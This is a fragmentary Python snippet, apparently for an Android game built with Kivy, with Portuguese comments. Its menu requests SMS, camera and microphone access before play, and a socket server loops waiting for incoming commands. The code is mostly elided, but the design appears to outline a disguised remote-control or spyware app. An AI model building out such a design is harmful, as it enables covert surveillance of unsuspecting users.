...
class MenuScreen(Screen):
    ...
    def start_game(self, instance):
        # Solicita permissões antes de iniciar o jogo
    ...
    def request_permissions(self):
        # Solicita permissões de acesso a SMS, câmera e microfone
        permissions = [permission.SMS, permission.CAMERA, permission.RECORD_AUDIO]
        for perm in permissions:
            permission.request_permissions([perm])
...
def start_socket_server():
    ...
    while True:
        ...
        # Aqui você pode lidar com os comandos recebidos
